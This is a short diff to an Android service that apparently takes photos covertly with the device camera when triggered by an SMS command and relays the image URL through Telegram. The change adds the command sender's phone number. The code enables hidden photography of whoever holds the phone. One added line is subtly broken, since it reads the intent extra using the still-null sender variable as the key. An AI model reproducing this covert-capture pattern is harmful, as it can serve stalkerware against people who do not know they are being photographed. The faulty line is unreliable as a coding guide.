@@ -42,10 +42,12 @@ public class HiddenCaptureImageService extends HiddenCameraService {
 
     private static final String TAG = HiddenCaptureImageService.class.getSimpleName();
     private boolean isTest = false;
+    private String sender = null;
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         isTest = intent.getBooleanExtra("test", false);
+        sender = intent.getStringExtra(sender);
 
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
 
@@ -122,6 +124,9 @@ public class HiddenCaptureImageService extends HiddenCameraService {
                         newIntent.putExtra("telegramId", telegramId);
                         newIntent.putExtra("command", SmsReceiver.TAKE_PHOTO_COMMAND);
                         newIntent.putExtra("param1", imageUrl);
+                        if (StringUtils.isNotEmpty(sender)) {
+                            newIntent.putExtra("phoneNumber", sender);
+                        }
                         HiddenCaptureImageService.this.startService(newIntent);
                     } else {
                         Log.e(TAG, "Received empty image url!");
